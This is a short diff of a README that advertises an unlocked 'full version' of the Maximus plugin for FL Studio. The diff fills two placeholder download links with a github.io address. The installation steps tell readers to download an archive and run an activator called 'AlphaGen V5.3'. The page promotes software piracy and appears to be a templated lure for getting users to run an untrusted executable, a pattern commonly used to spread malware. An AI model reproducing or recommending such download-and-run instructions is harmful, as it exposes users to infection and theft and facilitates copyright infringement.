@@ -2,13 +2,13 @@
 
 Unlock the full version of Maximus for FL Studio. Enhance your mastering, compression, and multiband control with studio-grade precision.
 
-[![Download](https://img.shields.io/badge/Download-Maximus-blueviolet)](PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download](https://img.shields.io/badge/Download-Maximus-blueviolet)](https://maximus-fl-studio.github.io/.github)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 [Download the archive](PLACE_YOUR_DOWNLOAD_LINK_HERE)  
+1. 📦 [Download the archive](https://maximus-fl-studio.github.io/.github)  
 2. 📁 Extract the folder to any convenient location on your system  
 3. 🖱 Run AlphaGen V5.3 to activate and configure plugin settings  
 4. ✅ Launch FL Studio and start using Maximus with full functionality
